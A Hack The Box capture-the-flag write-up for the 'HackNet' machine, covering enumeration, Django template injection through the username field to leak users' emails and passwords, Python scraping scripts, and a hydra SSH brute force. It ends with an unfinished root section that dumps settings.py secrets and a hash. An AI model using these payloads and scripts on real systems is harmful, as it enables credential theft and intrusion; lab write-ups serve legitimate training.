---
name: HackNet
difficulty: medium
os: linux
platform: htb
date: 2025/11/14
releasedDate: 2009-12-31
userFlag: false
rootFlag: false

img: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/d131f54a035866ca64f0aff0a8e1fc14.png
---

## Enumeration

We start by scanning the target machine for open ports using Nmap. We will use the `-p-` option to scan all ports and the `--open` option to filter out closed ports:
```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.11.85 -o allPorts
```
```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

We add dns resolution for target machine in `/etc/hosts` file

```
10.10.11.85  hacknet.htb
```

Now we will scan the open ports with service version detection and script scanning using `-sC` and `-sV` options

```bash
nmap -p -sCV 10.10.11.85 -o targeted
```
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 95:62:ef:97:31:82:ff:a1:c6:08:01:8c:6a:0f:dc:1c (ECDSA)
|_  256 5f:bd:93:10:20:70:e6:09:f1:ba:6a:43:58:86:42:66 (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-title: HackNet - social network for hackers
|_http-server-header: nginx/1.22.1
```

We find a web application running on port 80. We navigate to the web page and find a login and a registration page.

We register a new user and login to the application. We find a web that allows us to add posts, comments and like other users posts.

We discover a GET endpoint `/likes/<post_id>` that returns a list of users that liked a post:
```html
<div class="likes-review-item">
    <a href="/profile/4">
        <img src="/media/4.jpg" title="zero_day">
    </a>
</div>
<div class="likes-review-item">
    <a href="/profile/7">
        <img src="/media/7.png" title="blackhat_wolf">
    </a>
</div>
<div class="likes-review-item">
    <a href="/profile/10">
        <img src="/media/10.png" title="datadive">
    </a>
</div>
```

We can see there is a `title` attribute in the img tag that reveals the username of the user. This looks like a posible SSTI (Server Side Template Injection).

We also discover a GET endpoint `/like/<post_id>` that allows us to like any post in the application (even if post is private):
```
Success
```

We can use these two endpoints on our advantage.

1. Like all posts in the application using `/like/<post_id>` endpoint.
2. Change our username to a payload that take advantage of the SSTI vulnerability.
3. Visit the `/likes/<post_id>` endpoint and check the SSTI payload results.

## User Exploitation

First, we like all the posts in the application. We can do this by iterating over all the post ids and sending a GET request to the `/like/<post_id>` endpoint
```python
import requests
import re

url = "http://hacknet.htb"
cookies = {
    "csrftoken": "gND22sgd7wbhDsX3nJi2VzvgeZO3ys43",
    "sessionid": "axxrdqs5xyzhytt1f2l1ve4bqgh7tbtk"
}
myid = 27

profile_pat = re.compile(
    rf'<a\s+href="/profile/{re.escape(str(myid))}"[^>]*>.*?<img[^>]*\btitle="([^"]+)"',
    re.DOTALL | re.IGNORECASE
)

def  getKey(num):
    res1 = requests.get(f"{url}/likes/{num}", cookies=cookies)
    if not res1.status_code == 200:
        print(f"Error getting likes for post {num}")
        return None

    profile_match = profile_pat.search(res1.text)
    # see if my id (34) is in list, if remove like
    if not profile_match:
        res2 = requests.get(f"{url}/like/{num}", cookies=cookies)
        print(f"Like post {num}, status code: {res2.text}")

if __name__ == "__main__":
    for i in range(1, 101):
        getKey(i)
```

Next, we change our username to the following payload:
```
{{ users.0.email }}
```

Finally, we visit the `/likes/<post_id>` endpoint to check the SSTI payload results. First, we get emails:
```python
import requests
import re

url = "http://hacknet.htb"
cookies = {
    "csrftoken": "gND22sgd7wbhDsX3nJi2VzvgeZO3ys43",
    "sessionid": "axxrdqs5xyzhytt1f2l1ve4bqgh7tbtk"
}
myid = 27
filename = "emails.txt"

profile_pat = re.compile(
    rf'<a\s+href="/profile/{re.escape(str(myid))}"[^>]*>.*?<img[^>]*\btitle="([^"]+)"',
    re.DOTALL | re.IGNORECASE
)


def  getKey(num):
    res1 = requests.get(f"{url}/likes/{num}", cookies=cookies)
    if not res1.status_code == 200:
        print(f"Error getting likes for post {num}")
        return None

    profile_match = profile_pat.search(res1.text)

    return profile_match.group(1) if profile_match else None

if __name__ == "__main__":
    with open(filename, "a") as f:
        for i in range(1, 101):
            key = getKey(i)
            if key:
                f.write(f"{key}\n")
```

Then we change our username to the following payload:
```
{{ users.0.password }}
```

Finally we change the `filename` and we run the script again to get the passwords.

Next step is to remove domain part from emails and keep only usernames:
```bash
awk -F'@' '{print $1}' emails.txt > usernames.txt
```

Then we merge both files to get a list of valid credentials:
```bash
paste -d':' usernames.txt passwords.txt > merged.txt
```

We use `hydra` to bruteforce ssh using the valid credentials we got:
```bash
hydra -C merged.txt ssh://hacknet.htb -I
```
```
[DATA] attacking ssh://hacknet.htb:22/
[22][ssh] host: hacknet.htb   login: mikey   password: mYd4rks1dEisH3re
1 of 1 target successfully completed, 1 valid password found
```

We successfully bruteforced the ssh credentials for user `mikey`.
We ssh into the machine using the credentials we got:
```bash
ssh mikey@hacknet.htb
whoami
```
```
mikey
```

## Root Exploitation

cat HackNet/settings.py 

SECRET_KEY = 'agyasdf&^F&ADf87AF*Df9A5D^AS%D6DflglLADIuhldfa7w'

DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.mysql',
        'NAME': 'hacknet',
        'USER': 'sandy',
        'PASSWORD': 'h@ckn3tDBpa$$',
        'HOST':'localhost',
        'PORT':'3306',
    }
}

pbkdf2_sha256$720000$I0qcPWSgRbUeGFElugzW45$r9ymp7zwsKCKxckgnl800wTQykGK3SgdRkOxEmLiTQQ=

## Conclusion
